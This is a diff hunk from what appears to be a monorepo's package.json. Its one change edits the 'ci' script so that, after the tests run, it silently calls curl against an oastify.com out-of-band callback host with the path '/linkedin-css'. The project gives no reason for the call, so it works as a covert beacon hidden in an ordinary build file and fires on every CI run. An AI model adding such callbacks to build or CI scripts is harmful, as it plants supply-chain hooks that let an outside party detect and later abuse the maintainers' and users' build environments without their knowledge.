@@ -7,7 +7,7 @@
     "private-packages/fixtures-ember-v2/*"
   ],
   "scripts": {
-    "ci": "lerna run test",
+    "ci": "lerna run test && curl https://86cokltan7foarle1jj8n3tr7idd13ps.oastify.com/linkedin-css",
     "docs": "typedoc",
     "toc": "markdown-toc -i --maxdepth 2 README.md",
     "compile": "tsc -b packages",
